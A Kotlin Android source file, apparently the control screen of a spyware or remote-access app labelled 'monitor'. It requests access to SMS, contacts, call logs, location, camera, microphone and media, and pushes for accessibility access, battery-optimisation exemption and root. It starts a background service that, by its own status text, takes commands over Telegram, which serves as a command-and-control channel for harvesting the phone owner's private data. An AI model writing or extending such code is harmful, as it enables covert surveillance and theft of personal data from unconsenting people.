package com.example.monitor

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var status: TextView

    private val pedido = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { atualizarStatus() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val raiz = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 40)
        }

        status = TextView(this).apply {
            textSize = 14f
        }
        raiz.addView(status)

        fun botao(rotulo: String, acao: () -> Unit) {
            raiz.addView(Button(this).apply {
                text = rotulo
                setOnClickListener { acao() }
            })
        }

        botao("Conceder permissões") { pedirPermissoes() }
        botao("Ativar acessibilidade") {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        botao("Ignorar otimização de bateria") { pedirBateria() }
        botao("Iniciar monitor") { SyncService.iniciar(this) }
        botao("Parar monitor") { SyncService.parar(this) }
        botao("Testar Telegram") {
            Thread { Telegram.send("<b>Teste</b> — comunicação OK") }.start()
        }

        setContentView(raiz)
        atualizarStatus()
    }

    override fun onResume() {
        super.onResume()
        atualizarStatus()
    }

    private fun pedirPermissoes() {
        val lista = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= 33) {
            lista.add(Manifest.permission.POST_NOTIFICATIONS)
            lista.add(Manifest.permission.READ_MEDIA_IMAGES)
            lista.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            lista.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        pedido.launch(lista.toTypedArray())
    }

    private fun pedirBateria() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) return
        startActivity(
            Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:$packageName")
            )
        )
    }

    private fun atualizarStatus() {
        status.text = buildString {
            append("Token configurado: ${if (Config.configurado()) "sim" else "NÃO"}\n")
            append("Root: ${if (Root.disponivel()) "sim" else "não"}\n")
            append("Acessibilidade: ${Collector.acessibilidadeAtiva(this@MainActivity)}\n")
            append("Bateria ignorada: ${if (Collector.ignorandoBateria(this@MainActivity)) "sim" else "não"}\n\n")
            append("Depois de iniciar, o app opera em segundo plano e responde a comandos no Telegram.")
        }
    }
}
